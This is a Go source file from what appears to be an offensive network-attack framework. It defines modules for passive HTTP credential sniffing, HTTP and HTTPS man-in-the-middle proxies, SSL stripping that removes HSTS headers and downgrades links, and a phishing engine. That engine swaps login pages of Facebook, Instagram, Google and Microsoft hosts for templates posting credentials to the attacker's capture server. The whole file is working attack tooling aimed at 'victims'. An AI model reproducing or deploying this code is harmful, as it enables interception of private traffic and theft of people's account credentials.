// Package espionage contains the traffic-harvesting and interception modules:
// passive credential sniffing, the inline HTTP(S) MITM proxy and the
// phishing form-swap engine.
package espionage

import (
	"fmt"
	"log/slog"
	"strings"
	"time"

	"github.com/QYVORA/qyvora-toha3ee/internal/attacks"
	"github.com/QYVORA/qyvora-toha3ee/internal/netx/proxy"
	"github.com/QYVORA/qyvora-toha3ee/internal/netx/sniff"
	"github.com/QYVORA/qyvora-toha3ee/internal/phish"
	"github.com/QYVORA/qyvora-toha3ee/internal/safety"
)

// init self-registers every espionage module into the global registry.
func init() {
	attacks.Register(&HTTPHarvest{})
	attacks.Register(&HTTPProxy{})
	attacks.Register(&HTTPSProxy{})
	attacks.Register(&SSLStrip{})
	attacks.Register(&PhishInject{})
}

// HTTPHarvest passively sniffs plaintext HTTP for credentials and sessions.
type HTTPHarvest struct{}

// Meta implements attacks.Module.
func (*HTTPHarvest) Meta() attacks.ModuleMeta {
	return attacks.ModuleMeta{
		ID:          "http.harvest",
		Category:    "espionage",
		Risk:        attacks.RiskMedium,
		Targets:     []string{"subnet", "host"},
		Requires:    []string{"cap.sniff"},
		Description: "passive capture of plaintext HTTP credentials and sessions (requires arp.spoof to redirect traffic here)",
		Limitations: "only captures plaintext traffic; HTTPS, HSTS and certificate-pinned traffic are invisible",
	}
}

// harvestState carries the live sniffer and the optional pcap output path so
// Verify/Cleanup can reach the running capture.
type harvestState struct {
	sniff *sniff.Sniffer
	out   string
}

// Preflight checks the interface and MITM posture.
func (*HTTPHarvest) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, error) {
	rep := &attacks.PreflightReport{}
	if ctx.Iface == nil {
		rep.AddBlocked("iface", "no interface configured")
		return rep, nil
	}
	rep.AddOK("iface", ctx.Iface.String())
	rep.AddFixable("mitm", "run arp.spoof so victim traffic actually flows through this host")
	return rep, nil
}

// Run starts the sniffer and blocks until ctx.Done.
func (*HTTPHarvest) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
	out := ctx.Conf.Get("http.harvest", "pcap")
	sniffer, err := sniff.New(ctx.Iface, ctx.Bus, ctx.Store, slog.Default())
	if err != nil {
		return fmt.Errorf("http.harvest: %w", err)
	}
	if err := sniffer.Start(out); err != nil {
		return fmt.Errorf("http.harvest: %w", err)
	}
	ctx.SetState("http.harvest", &harvestState{sniff: sniffer, out: out})
	// Registered cleanup runs even if the session aborts unexpectedly.
	ctx.Safety.RegisterCleanup("http.harvest", "stop passive sniffer", func() error {
		sniffer.Stop()
		return nil
	})
	if out != "" {
		ctx.Printf("[*] http.harvest capturing traffic to %s (creds and sessions logged as they appear).\n", out)
	} else {
		ctx.Printf("[*] http.harvest capturing traffic (creds and sessions logged as they appear).\n")
	}

	// Long-running module: beat the watchdog every 2s and exit on ctx.Done.
	hb := safety.NewHeartbeat()
	ctx.Heartbeat = hb.Beat
	ctx.Safety.RegisterHeartbeat("http.harvest", hb)
	for {
		select {
		case <-ctx.Done:
			return nil
		case <-time.After(2 * time.Second):
			hb.Beat()
		}
	}
}

// Verify reports capture stats and harvest totals.
func (*HTTPHarvest) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
	v, ok := ctx.GetState("http.harvest")
	if !ok {
		return nil, fmt.Errorf("http.harvest not running")
	}
	st := v.(*harvestState)
	pkts, byts := st.sniff.Stats()
	creds := ctx.Store.Creds()
	imp := &attacks.Impact{
		Summary: fmt.Sprintf("captured %d packets (%s); store holds %d credential(s)", pkts, fmtBytes(byts), len(creds)),
	}
	imp.Add("packets", fmt.Sprintf("%d", pkts))
	imp.Add("bytes", fmtBytes(byts))
	imp.Add("creds", fmt.Sprintf("%d", len(creds)))
	imp.Add("sessions", fmt.Sprintf("%d", len(ctx.Store.Sessions())))
	if st.out != "" {
		imp.Add("pcap", st.out)
	}
	return imp, nil
}

// Cleanup stops the sniffer.
func (*HTTPHarvest) Cleanup(ctx *attacks.AttackCtx) error {
	// Tear down the safety entries first so a second Cleanup pass (session
	// shutdown) does not double-stop the sniffer.
	ctx.Safety.UnregisterHeartbeat("http.harvest")
	ctx.Safety.UnregisterCleanup("http.harvest")
	if v, ok := ctx.GetState("http.harvest"); ok {
		v.(*harvestState).sniff.Stop()
	}
	return nil
}

// fmtBytes renders a byte count as a human-readable size.
func fmtBytes(b uint64) string {
	switch {
	case b >= 1<<20:
		return fmt.Sprintf("%.1f MiB", float64(b)/(1<<20))
	case b >= 1<<10:
		return fmt.Sprintf("%.1f KiB", float64(b)/(1<<10))
	default:
		return fmt.Sprintf("%d B", b)
	}
}

// HTTPProxy runs the inline HTTP MITM proxy (HTTPS tunnelled, not intercepted).
type HTTPProxy struct{}

// Meta implements attacks.Module.
func (*HTTPProxy) Meta() attacks.ModuleMeta {
	return attacks.ModuleMeta{
		ID:          "http.proxy",
		Category:    "espionage",
		Risk:        attacks.RiskHigh,
		Targets:     []string{"gateway", "host"},
		Requires:    []string{"cap.ip_forward"},
		Description: "inline HTTP MITM proxy: harvest credentials/sessions, inject JS and rewrite pages",
		Limitations: "browsers must route traffic through this proxy (set via PAC/WPAD, DHCP, or iptables REDIRECT); HTTPS is tunnelled unread",
	}
}

// Preflight verifies the proxy can bind and forwarding is on.
func (*HTTPProxy) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, error) {
	rep := &attacks.PreflightReport{}
	rep.AddOK("listen", "TCP proxy port is non-privileged (default 8080)")
	if err := safety.RequireRoot(); err == nil {
		rep.AddOK("root", "raw packets available (iptables REDIRECT supported)")
	} else {
		rep.AddFixable("root", err.Error())
	}
	if ctx.Iface == nil {
		rep.AddBlocked("iface", "no interface configured")
	} else {
		rep.AddOK("iface", ctx.Iface.String())
	}
	rep.AddFixable("routing", "point victims' proxy settings at this host, or use arp.spoof + iptables REDIRECT to force traffic")
	return rep, nil
}

// Run starts the proxy and blocks.
func (m *HTTPProxy) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
	mp, err := startProxy(ctx, false)
	if err != nil {
		return err
	}
	ctx.Printf("[*] http.proxy listening on %s (HTTPS tunnelled unread). Point victims here or use arp.spoof + iptables REDIRECT.\n", mp.Addr())
	return blockProxy(ctx, mp, "http.proxy")
}

// Verify reports proxy stats.
func (*HTTPProxy) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
	return proxyImpact(ctx, "http.proxy")
}

// Cleanup stops the proxy.
func (*HTTPProxy) Cleanup(ctx *attacks.AttackCtx) error {
	return stopProxy(ctx, "http.proxy")
}

// HTTPSProxy runs the proxy with CA-based HTTPS interception.
type HTTPSProxy struct{}

// Meta implements attacks.Module.
func (*HTTPSProxy) Meta() attacks.ModuleMeta {
	return attacks.ModuleMeta{
		ID:          "https.proxy",
		Category:    "espionage",
		Risk:        attacks.RiskHigh,
		Targets:     []string{"gateway", "host"},
		Requires:    []string{"cap.ip_forward", "cap.ca_trust"},
		Description: "HTTPS MITM via a framework CA: decrypt, harvest and rewrite TLS traffic",
		Limitations: "the framework CA must be trusted on the victim device; certificate pinning and Android 7+/iOS user-CA rules block interception",
	}
}

// Preflight warns about CA trust.
func (*HTTPSProxy) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, error) {
	rep := &attacks.PreflightReport{}
	rep.AddOK("ca", "framework CA loaded")
	rep.AddOK("listen", "TCP proxy port is non-privileged")
	rep.AddFixable("ca_trust", "install the framework CA on the victim device (https.proxy.ca_path); this is the only way decryption works")
	return rep, nil
}

// Run starts the MITM proxy with the CA.
func (m *HTTPSProxy) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
	mp, err := startProxy(ctx, true)
	if err != nil {
		return err
	}
	ctx.Printf("[*] https.proxy MITM active on %s. Victims that trust the framework CA are decrypted.\n", mp.Addr())
	return blockProxy(ctx, mp, "https.proxy")
}

// Verify reports proxy stats.
func (*HTTPSProxy) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
	return proxyImpact(ctx, "https.proxy")
}

// Cleanup stops the proxy.
func (*HTTPSProxy) Cleanup(ctx *attacks.AttackCtx) error {
	return stopProxy(ctx, "https.proxy")
}

// SSLStrip defeats the HTTPS/HSTS upgrade path: it strips
// Strict-Transport-Security headers, deletes HPKP pinning and rewrites
// https:// links to http:// so victims keep using clear-text HTTP through the
// proxy where credentials and sessions can be harvested.
//
// How it works in one sentence: if the browser never learns a site is
// HTTPS-only (no HSTS header cached) and every https:// link is rewritten to
// http://, the victim browses in the clear and the proxy reads everything.
type SSLStrip struct{}

// Meta implements attacks.Module.
func (*SSLStrip) Meta() attacks.ModuleMeta {
	return attacks.ModuleMeta{
		ID:          "ssl.strip",
		Category:    "espionage",
		Risk:        attacks.RiskHigh,
		Targets:     []string{"gateway", "host"},
		Requires:    []string{"cap.ip_forward"},
		Description: "SSL strip + HSTS hijack: strip Strict-Transport-Security, drop HPKP and rewrite https:// links to http:// through the proxy",
		Limitations: "browsers with preloaded HSTS hosts or TLS-only access ignore downgraded links; modern browsers increasingly block mixed content",
	}
}

// Preflight mirrors http.proxy plus the strip readiness check.
func (*SSLStrip) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, error) {
	rep := &attacks.PreflightReport{}
	rep.AddOK("listen", "TCP proxy port is non-privileged (default 8080)")
	rep.AddOK("strip", "HSTS header stripping and https:// link rewriting enabled")
	rep.AddFixable("routing", "point victims at the http.proxy listener or use arp.spoof + iptables REDIRECT to force traffic here")
	if err := safety.RequireRoot(); err == nil {
		rep.AddOK("root", "raw packets available (iptables REDIRECT supported)")
	} else {
		rep.AddFixable("root", err.Error())
	}
	return rep, nil
}

// Run starts the HTTP proxy with SSL strip forced on.
func (*SSLStrip) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
	cfg := proxyConfig(ctx, false)
	// Force the strip behaviour regardless of the generic sslstrip config
	// knobs — the module IS the strip.
	cfg.SSLStrip = true
	mp := proxy.New(cfg)
	addr, err := mp.Start()
	if err != nil {
		return err
	}
	ctx.SetState(proxyStateKey, mp)
	ctx.Safety.RegisterCleanup(proxyStateKey, "stop ssl.strip proxy", func() error {
		mp.Stop()
		return nil
	})
	ctx.Printf("[*] ssl.strip active on %s: HSTS stripped, https:// links rewritten to http://.\n", addr)
	return blockProxy(ctx, mp, "ssl.strip")
}

// Verify reports proxy stats plus strip counters.
func (*SSLStrip) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
	return proxyImpact(ctx, "ssl.strip")
}

// Cleanup stops the proxy.
func (*SSLStrip) Cleanup(ctx *attacks.AttackCtx) error {
	return stopProxy(ctx, "ssl.strip")
}

// PhishInject swaps real login pages for the embedded phishing templates and
// captures submissions on the standalone capture server.
//
// The proxy inspects each HTTP response for the brand's hostnames; when a
// login page matches, the body is replaced by the phishing template whose
// form posts to the capture server. The victim still sees the real domain in
// the URL bar.
type PhishInject struct{}

// Meta implements attacks.Module.
func (*PhishInject) Meta() attacks.ModuleMeta {
	return attacks.ModuleMeta{
		ID:          "phish.inject",
		Category:    "espionage",
		Risk:        attacks.RiskHigh,
		Targets:     []string{"gateway", "host"},
		Requires:    []string{"cap.ip_forward"},
		Description: "rewrite login pages on real sites with embedded phishing templates and harvest submitted credentials",
		Limitations: "only works on plaintext HTTP (HSTS and HTTPS targets are not swapped); the victim must browse through this proxy",
	}
}

// Preflight verifies a brand is configured.
func (*PhishInject) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, error) {
	rep := &attacks.PreflightReport{}
	brand := ctx.Conf.GetDefault("phish.inject", "brand", "generic")
	if !phish.IsKnownTemplate(brand) {
		rep.AddBlocked("brand", fmt.Sprintf("unknown template %q (available: %v)", brand, templateIDs()))
	} else {
		rep.AddOK("brand", brand)
	}
	rep.AddOK("listen", "capture server binds a non-privileged port (default 8081)")
	rep.AddFixable("routing", "point victims at the http.proxy listener; only HTTP hosts matching the brand's domains are swapped")
	return rep, nil
}

// Run starts the proxy (form swap enabled) plus the capture server.
func (m *PhishInject) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
	brand := ctx.Conf.GetDefault("phish.inject", "brand", "generic")
	domains := brandDomains(brand, ctx.Conf.Get("phish.inject", "domains"))

	capPort := ctx.Conf.GetDefault("phish.inject", "capture_port", "8081")
	// The capture server is the sink for submitted phish forms; it writes
	// straight into the shared store.
	capture := phish.NewCaptureServer("0.0.0.0:"+capPort, ctx.Store, ctx.Bus, slog.Default())
	if err := capture.Start(); err != nil {
		return fmt.Errorf("phish.inject: %w", err)
	}

	proxyCfg := proxyConfig(ctx, false)
	proxyCfg.PhishDomains = domains
	// Swapped forms post to the capture server on the attacker's IP so the
	// victim's browser can reach it even when it was browsing an external
	// host.
	proxyCfg.PhishCaptureURL = "http://" + ctx.Iface.IP.String() + ":" + capPort
	mp := proxy.New(proxyCfg)
	addr, err := mp.Start()
	if err != nil {
		capture.Stop()
		return err
	}

	st := &phishState{mp: mp, capture: capture, domains: domains}
	ctx.SetState("phish.inject", st)
	ctx.Safety.RegisterCleanup("phish.inject", "stop proxy and capture server", func() error {
		mp.Stop()
		capture.Stop()
		return nil
	})
	ctx.Printf("[*] phish.inject (%s) active: %v. Proxy on %s, capture on :%s.\n",
		brand, keys(domains), addr, capPort)

	hb := safety.NewHeartbeat()
	ctx.Heartbeat = hb.Beat
	ctx.Safety.RegisterHeartbeat("phish.inject", hb)
	for {
		select {
		case <-ctx.Done:
			return nil
		case <-time.After(2 * time.Second):
			hb.Beat()
		}
	}
}

// Verify reports swap and harvest counts.
func (*PhishInject) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
	v, ok := ctx.GetState("phish.inject")
	if !ok {
		return nil, fmt.Errorf("phish.inject not running")
	}
	st := v.(*phishState)
	reqs, harvest, swaps := st.mp.Stats()
	phished := len(ctx.Store.CredsBySource("phish"))
	imp := &attacks.Impact{
		Summary: fmt.Sprintf("served %d form swap(s), captured %d credential(s), %d harvest(s)", swaps, phished, harvest),
	}
	imp.Add("requests", fmt.Sprintf("%d", reqs))
	imp.Add("swaps", fmt.Sprintf("%d", swaps))
	imp.Add("harvests", fmt.Sprintf("%d", harvest))
	imp.Add("phished_creds", fmt.Sprintf("%d", phished))
	imp.Add("domains", fmt.Sprint(keys(st.domains)))
	return imp, nil
}

// Cleanup stops the proxy and capture server.
func (*PhishInject) Cleanup(ctx *attacks.AttackCtx) error {
	ctx.Safety.UnregisterHeartbeat("phish.inject")
	ctx.Safety.UnregisterCleanup("phish.inject")
	if v, ok := ctx.GetState("phish.inject"); ok {
		st := v.(*phishState)
		st.mp.Stop()
		st.capture.Stop()
	}
	return nil
}

// phishState ties the running proxy, capture server and swapped domains
// together for Verify/Cleanup.
type phishState struct {
	mp      *proxy.MITMProxy
	capture *phish.CaptureServer
	domains map[string]string
}

// templateIDs lists the available phish template IDs for error reporting.
func templateIDs() []string {
	ts := phish.ListTemplates()
	out := make([]string, 0, len(ts))
	for _, t := range ts {
		out = append(out, t.ID)
	}
	return out
}

// brandDomains maps a brand to the hostnames that should be swapped. An
// explicit domains override wins; otherwise built-in per-brand host lists are
// used. The map value is the brand name the swap engine looks up.
func brandDomains(brand, override string) map[string]string {
	base := map[string]string{
		"facebook":  "facebook.com",
		"instagram": "instagram.com",
		"google":    "google.com",
	}
	out := map[string]string{}
	if override != "" {
		for _, d := range splitList(override) {
			out[strings.ToLower(d)] = brand
		}
		return out
	}
	// Facebook owns several surfaces: the main site plus the mobile variants
	// (m. subdomain) are the ones victims actually log in from.
	for _, d := range []string{"www.facebook.com", "m.facebook.com", "facebook.com"} {
		out[d] = brand
	}
	for _, d := range []string{"www.instagram.com", "instagram.com"} {
		out[d] = brand
	}
	if _, ok := base[brand]; ok {
		return out
	}
	// Generic/other brands: swap any host. The listed identity/portal hosts
	// are the most common targets in practice.
	for _, d := range []string{"login.microsoftonline.com", "accounts.google.com", "mail.google.com", "gmail.com"} {
		out[d] = brand
	}
	return out
}

// splitList tokenizes a comma/space separated string, dropping empties.
func splitList(s string) []string {
	var out []string
	for _, f := range strings.FieldsFunc(s, func(r rune) bool { return r == ',' || r == ' ' }) {
		if f != "" {
			out = append(out, f)
		}
	}
	return out
}

// keys extracts the keys of a string map (used for stable report lines).
func keys(m map[string]string) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	return out
}
